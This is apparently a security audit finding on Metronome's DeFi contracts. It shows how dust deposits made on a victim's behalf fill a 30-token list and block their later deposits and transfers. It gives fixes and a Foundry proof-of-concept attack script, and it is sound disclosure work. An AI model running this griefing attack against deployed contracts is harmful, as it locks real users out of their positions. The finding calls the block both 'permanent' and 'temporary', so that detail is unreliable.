### Title
Deposit of dust collateral `onBehalfOf` a victim fills their `depositTokensOfAccount` list, blocking all subsequent deposits and deposit-token transfers to that account - ([File: contracts/Pool.sol](contracts/Pool.sol), [File: contracts/DepositToken.sol](contracts/DepositToken.sol))

### Summary
The CVE-2016-1182 bug class is "improper restriction of a user-controlled input leading to denial of service via crafted input." The Metronome analog is `DepositToken.deposit(uint256 amount_, address onBehalfOf_)`: `onBehalfOf_` is fully attacker-controlled, and every mint to an account with a zero prior balance appends that deposit token to the account's per-user list in `Pool`. Once the list reaches `MAX_TOKENS_PER_USER = 30`, `Pool.addToDepositTokensOfAccount` reverts with `UserReachedMaxTokens`, permanently blocking any new deposit-token type from reaching the victim.

### Finding Description
`DepositToken.deposit` accepts any non-zero `amount_` and any non-zero `onBehalfOf_` with no consent check — anyone can deposit collateral on behalf of any account (`DepositToken.sol:211-237`). The deposit calls `_mint(onBehalfOf_, ...)`, which invokes `pool.addToDepositTokensOfAccount(account_)` whenever the recipient's balance was zero (`DepositToken.sol:469-489`).

In `Pool`, the per-account set `depositTokensOfAccount` is capped at `MAX_TOKENS_PER_USER = 30` (`Pool.sol:79`); adding a new token beyond that reverts with `UserReachedMaxTokens` (`Pool.sol:32`). The same limit applies to `_transfer`, which also calls `addToDepositTokensOfAccount(recipient_)` on first receipt (`DepositToken.sol:498-526`).

Attack path:

1. Attacker acquires a tiny amount of each underlying collateral supported by the pool (or uses multiple pools' deposit tokens).
2. For each `DepositToken` the victim does not yet hold, attacker calls `depositToken.deposit(1 wei, victim)` (plus approval of the underlying). Each call adds that token to `victim`'s `depositTokensOfAccount`.
3. Repeat until the victim's set holds 30 entries.
4. Thereafter: any `deposit` or `transfer`/`transferFrom`/`seize` involving a deposit token the victim doesn't already hold reverts inside `_mint`/`_transfer` when `addToDepositTokensOfAccount` hits the cap — even though the tokens the victim already holds remain withdrawable.

No privileged role, oracle manipulation, or governance action is required; the only cost is dust amounts of underlying across the pool's collateral list plus gas.

### Impact Explanation
Temporary freezing / denial of the deposit and receipt surface for the targeted account. The victim cannot:

- Deposit (or receive `onBehalfOf` deposits of) any collateral type they don't already hold — they are locked out of adding new collateral classes, blocking position adjustments (e.g., topping up a different collateral to restore health is impossible if that token isn't already in their list).
- Receive transfers of any new `DepositToken`, including liquidation-related flows where a `seize` credits tokens to an account whose balance was zero — `seize` goes through `_transfer`, so a seizure that would mint a new token entry for the recipient reverts, which can block `Pool.liquidate` paths that send a not-held collateral to the fee collector/liquidator (only if that recipient is also capped; the direct victim impact is on deposits/transfers to the victim).
- Receive SmartFarmingManager flows that mint new deposit-token types to the account.

The victim can recover by withdrawing/transferring the dust deposit tokens down to zero, which triggers `removeFromDepositTokensOfAccount` (`DepositToken.sol:459-463`, `522-525`) and frees list slots — hence "temporary" freezing rather than permanent loss. However, this requires the victim to detect the griefing and spend gas per token, and the attacker can re-fill freed slots cheaply since each re-add only costs a dust deposit.

### Likelihood Explanation
High feasibility, modest cost:

- `deposit` is permissionless and `onBehalfOf_` is unconstrained (only `BeneficiaryIsNull` on `address(0)`).
- `pause` does not stop the attack vector's effect: deposits are disabled when paused, but the attack only needs to be executed once while unpaused; the cap persists in storage.
- `whenNotShutdown`, `nonReentrant`, `SynthContext` checks, and supply caps do not prevent it — each individual deposit is a fully valid operation.
- The cap `MAX_TOKENS_PER_USER = 30` is small relative to the number of deployed deposit tokens across Metronome pools, and the attacker only needs dust (1 wei) of each underlying, transferred straight to the Treasury — the underlying never needs to be held by the victim.
- Sybil/fresh-account economics favor the attacker only if dust value is negligible; for assets like ETH-derived collateral, cost is a few wei of each asset per victim.

### Recommendation
- Restrict `deposit`'s `onBehalfOf_` to `_msgSender()` (i.e., remove third-party deposits), or gate it behind an opt-in/allowlist, so an attacker cannot force new token entries into a victim's account list.
- Alternatively, make `addToDepositTokensOfAccount` non-reverting on overflow for mints/transfers initiated by others, or decouple the "track token for debtPositionOf" list from a hard cap by using a different accounting structure (e.g., iterating the global deposit-token list and filtering by `balanceOf > 0`), removing the griefable limit entirely.
- At minimum, treat the `UserReachedMaxTokens` path as a soft failure for unsolicited inbound tokens: skip tracking instead of reverting, since the revert is what weaponizes the dust deposit.

### Proof of Concept
Foundry sketch (fork/mainnet-config test against a deployed `Pool`/`DepositToken` set, or the repo's Hardhat fixture):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {IPool} from "contracts/interfaces/IPool.sol";
import {IDepositToken} from "contracts/interfaces/IDepositToken.sol";
import {IERC20} from "contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";

contract DepositListGriefingTest is Test {
    IPool pool = IPool(POOL_ADDRESS); // deployed Pool proxy
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function testFillVictimTokenList() public {
        address[] memory depositTokens = pool.getDepositTokens();
        require(depositTokens.length >= 30, "need >=30 collaterals");

        // Victim currently holds none / fewer than 30 entries
        uint256 freeSlots = 30 - pool.getDepositTokensOfAccount(victim).length;

        for (uint256 i; i < freeSlots; ++i) {
            IDepositToken dt = IDepositToken(depositTokens[i]);
            if (dt.balanceOf(victim) != 0) continue;
            IERC20 underlying = dt.underlying();
            deal(address(underlying), attacker, 1);
            vm.startPrank(attacker);
            underlying.approve(address(dt), 1);
            dt.deposit(1, victim); // adds dt to victim's depositTokensOfAccount
            vm.stopPrank();
        }

        assertEq(pool.getDepositTokensOfAccount(victim).length, 30);

        // Victim now tries to deposit a collateral type it does not hold yet
        IDepositToken newDt = IDepositToken(depositTokens[freeSlots]);
        IERC20 newUnderlying = newDt.underlying();
        deal(address(newUnderlying), victim, 1e18);
        vm.startPrank(victim);
        newUnderlying.approve(address(newDt), 1e18);
        vm.expectRevert(); // UserReachedMaxTokens inside Pool.addToDepositTokensOfAccount
        newDt.deposit(1e18, victim);
        vm.stopPrank();

        // Third-party transfer of a new token type to victim also reverts
        // (DepositToken._transfer -> addToDepositTokensOfAccount)

        // Recovery path: victim withdraws dust tokens to zero to free slots
        vm.startPrank(victim);
        IDepositToken(depositTokens[0]).withdraw(IDepositToken(depositTokens[0]).balanceOf(victim), victim);
        vm.stopPrank();
        assertLt(pool.getDepositTokensOfAccount(victim).length, 30);
    }
}
```

Note: exploitability scales with the number of distinct `DepositToken`s registered in the pool (or reachable via `transfer` of tokens the attacker mints on another account); if a single pool has fewer than 30 collaterals, the attacker can still combine `deposit` entries with direct `transfer` of deposit tokens they hold. Exact pool token counts should be confirmed against the target deployment (e.g., `deployments/mainnet/Pool.json`).